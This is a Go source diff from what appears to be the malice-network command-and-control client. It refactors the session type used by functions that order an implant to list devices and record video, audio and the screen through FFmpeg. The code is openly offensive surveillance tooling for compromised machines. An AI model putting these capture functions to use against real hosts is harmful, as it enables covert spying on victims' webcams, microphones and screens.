@@ -1,10 +1,10 @@
 package third
 
 import (
+	"github.com/chainreactors/IoM-go/client"
 	"github.com/chainreactors/IoM-go/proto/client/clientpb"
 	"github.com/chainreactors/IoM-go/proto/implant/implantpb"
 	"github.com/chainreactors/IoM-go/proto/services/clientrpc"
-	"github.com/chainreactors/IoM-go/session"
 	"github.com/chainreactors/malice-network/client/repl"
 	"github.com/chainreactors/malice-network/helper/utils/output"
 	"github.com/spf13/cobra"
@@ -23,7 +23,7 @@ func ListDeviceCmd(con *repl.Console) error {
 	return nil
 }
 
-func ListDevice(rpc clientrpc.MaliceRPCClient, sess *session.Session) (*clientpb.Task, error) {
+func ListDevice(rpc clientrpc.MaliceRPCClient, sess *client.Session) (*clientpb.Task, error) {
 	task, err := rpc.FFmpeg(sess.Context(), &implantpb.FFmpegRequest{
 		Action:       "list_devices",
 		DeviceName:   "none",
@@ -51,7 +51,7 @@ func RecordVideoCmd(cmd *cobra.Command, con *repl.Console) error {
 	return nil
 }
 
-func RecordVideo(rpc clientrpc.MaliceRPCClient, sess *session.Session, deviceName, outputPath, duration string) (*clientpb.Task, error) {
+func RecordVideo(rpc clientrpc.MaliceRPCClient, sess *client.Session, deviceName, outputPath, duration string) (*clientpb.Task, error) {
 	task, err := rpc.FFmpeg(sess.Context(), &implantpb.FFmpegRequest{
 		Action:       "record_video",
 		DeviceName:   deviceName,
@@ -65,7 +65,7 @@ func RecordVideo(rpc clientrpc.MaliceRPCClient, sess *session.Session, deviceNam
 	return task, nil
 }
 
-func RecordAudio(rpc clientrpc.MaliceRPCClient, sess *session.Session, deviceName, outputPath, duration string) (*clientpb.Task, error) {
+func RecordAudio(rpc clientrpc.MaliceRPCClient, sess *client.Session, deviceName, outputPath, duration string) (*clientpb.Task, error) {
 	task, err := rpc.FFmpeg(sess.Context(), &implantpb.FFmpegRequest{
 		Action:       "record_audio",
 		DeviceName:   deviceName,
@@ -79,7 +79,7 @@ func RecordAudio(rpc clientrpc.MaliceRPCClient, sess *session.Session, deviceNam
 	return task, nil
 }
 
-func RecordScreen(rpc clientrpc.MaliceRPCClient, sess *session.Session, deviceName, outputPath, duration string) (*clientpb.Task, error) {
+func RecordScreen(rpc clientrpc.MaliceRPCClient, sess *client.Session, deviceName, outputPath, duration string) (*clientpb.Task, error) {
 	task, err := rpc.FFmpeg(sess.Context(), &implantpb.FFmpegRequest{
 		Action:       "record_screen",
 		DeviceName:   "",
